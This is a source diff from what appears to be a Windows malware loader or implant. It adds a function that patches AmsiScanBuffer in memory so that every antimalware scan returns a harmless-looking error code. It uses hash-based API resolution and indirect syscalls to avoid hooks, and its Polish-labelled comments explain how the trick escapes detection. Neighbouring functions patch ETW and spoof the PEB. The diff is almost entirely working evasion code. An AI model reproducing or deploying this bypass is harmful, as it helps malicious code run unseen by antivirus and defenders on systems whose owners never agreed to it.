@@ -85,6 +85,65 @@ BOOL Opsec_PatchEtw(void)
 }
 
 /* ============================================================
+ *  Opsec_PatchAmsi
+ *
+ *  Patches AmsiScanBuffer in the in-process amsi.dll to:
+ *    B8 57 00 07 80   mov eax, 0x80070057   (E_INVALIDARG)
+ *    C3               ret
+ *
+ *  CZYM:  Every AMSI scan (script content, memory buffers handed to
+ *         AmsiScanBuffer by instrumentation) returns E_INVALIDARG — the
+ *         documented "bad input" error.  Callers treat it as "not scanned",
+ *         not as "malicious", so no alert path fires.
+ *
+ *  DLACZEGO: amsi.dll is mapped into the process by AV/Defender before our
+ *         EntryPoint runs.  If it is NOT mapped (no AV), loading it ourselves
+ *         would create a fresh, timestamped IOC in the PEB LDR list — hence
+ *         the strict "patch only if already present" rule.
+ *
+ *  JAK:   Same HellsHall NtProtect RX → RW → RX pattern as Opsec_PatchEtw —
+ *         no direct call into the (possibly hooked) ntdll export stub.
+ * ============================================================ */
+BOOL Opsec_PatchAmsi(void)
+{
+    HMODULE hAmsi = GetModuleHandleH(g_Hash_amsi);
+    if (!hAmsi) return TRUE;   /* AMSI not in-process — nothing to do */
+
+    PBYTE pScan = (PBYTE)GetProcAddressH(hAmsi, g_Hash_AmsiScanBuffer);
+    if (!pScan) return FALSE;
+
+    DWORD dwProtectSsn       = 0;
+    PVOID pProtectTrampoline = NULL;
+    if (!Syscalls_GetParamsByHash(g_Hash_ZwProtectVirtualMemory,
+                                  &dwProtectSsn, &pProtectTrampoline))
+        return FALSE;
+
+    pfnNtProtect_t pNtProtect = (pfnNtProtect_t)HellsHallSyscall;
+
+    PVOID  pPage        = (PVOID)pScan;
+    SIZE_T regionSize   = 8;
+    ULONG  dwOldProtect = 0;
+
+    SetSyscallParams(dwProtectSsn, pProtectTrampoline);
+    NTSTATUS st = pNtProtect((HANDLE)-1, &pPage, &regionSize, PAGE_READWRITE, &dwOldProtect);
+    if (!NT_SUCCESS(st)) return FALSE;
+
+    pScan[0] = 0xB8;   /* mov eax, imm32 */
+    pScan[1] = 0x57;   /* 0x80070057 = E_INVALIDARG (LE) */
+    pScan[2] = 0x00;
+    pScan[3] = 0x07;
+    pScan[4] = 0x80;
+    pScan[5] = 0xC3;   /* ret */
+
+    pPage      = (PVOID)pScan;
+    regionSize = 8;
+    SetSyscallParams(dwProtectSsn, pProtectTrampoline);
+    pNtProtect((HANDLE)-1, &pPage, &regionSize, PAGE_EXECUTE_READ, &dwOldProtect);
+
+    return TRUE;
+}
+
+/* ============================================================
  *  Opsec_SpoofPeb
  *
  *  Modifies PEB->ProcessParameters->ImagePathName so that
